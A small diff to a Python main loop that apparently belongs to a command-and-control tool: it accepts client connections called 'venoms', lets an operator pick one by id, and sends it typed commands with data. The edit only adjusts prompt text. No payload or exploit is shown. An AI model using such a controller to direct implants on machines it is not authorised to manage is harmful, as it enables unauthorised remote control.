@@ -10,8 +10,8 @@ def main():
     Thread(target=server.accept_clients, ).start()
     while True:
         print(f"Available venoms: {[venom for venom in venom_handler.venoms]}")
-        venom_id = input("id: ")
-        command_type = CommandType[input(f"Command type: {list(CommandType)}")].value
+        venom_id = input("Id: ")
+        command_type = CommandType[input(f"Command type: {list(CommandType)}\n")].value
         data = input("Data: ").encode()
         command = Command(len(data), command_type, data)
         venom_handler.send_command(venom_id, command)
